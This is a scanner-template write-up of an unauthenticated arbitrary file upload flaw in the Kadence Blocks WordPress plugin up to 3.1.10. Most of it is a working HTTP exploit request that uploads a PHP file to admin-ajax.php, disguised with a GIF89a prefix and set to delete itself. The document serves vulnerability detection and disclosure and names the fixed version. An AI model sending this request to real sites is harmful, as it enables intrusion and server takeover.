# Nuclei Template: WordPress Gutenberg Blocks Plugin <= 3.1.10 - Arbitrary File Upload
**Template ID:** wp-kadence-blocks-rce
**Vulnerability Class:** Code Injection
**Severity:** Critical
**CWE:** CWE-94
**Source:** Nuclei Template (`wp-kadence-blocks-rce.yaml`)

## Vulnerability Information & PoC

## Description
The Kadence Blocks for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the process_fields function in versions up to, and including, 3.1.10. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------8779924633391890046425977712

-----------------------------8779924633391890046425977712
Content-Disposition: form-data; name="fieldfb0b94-aa"

{{str}}
-----------------------------8779924633391890046425977712
Content-Disposition: form-data; name="fieldec6f26-c7"

{{email}}
-----------------------------8779924633391890046425977712
Content-Disposition: form-data; name="fieldc9b894-4c"

{{str}}
-----------------------------8779924633391890046425977712
Content-Disposition: form-data; name="field983473-0a"; filename="{{filename}}.php"
Content-Type: application/x-php

GIF89a

<?php echo md5("{{string}}");unlink(__FILE__);?>
-----------------------------8779924633391890046425977712
Content-Disposition: form-data; name="_kb_adv_form_post_id"

{{post_id}}
-----------------------------8779924633391890046425977712
Content-Disposition: form-data; name="action"

kb_process_advanced_form_submit
-----------------------------8779924633391890046425977712
Content-Disposition: form-data; name="_kb_adv_form_id"

{{form_id}}
-----------------------------8779924633391890046425977712
Content-Disposition: form-data; name="_kb_form_verify"

{{nonce}}
-----------------------------8779924633391890046425977712--
```

## Remediation
Fixed in 3.1.11

## References
- https://wordpress.org/plugins/kadence-blocks/
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/kadence-blocks/kadence-blocks-3110-unauthenticated-arbitrary-file-upload
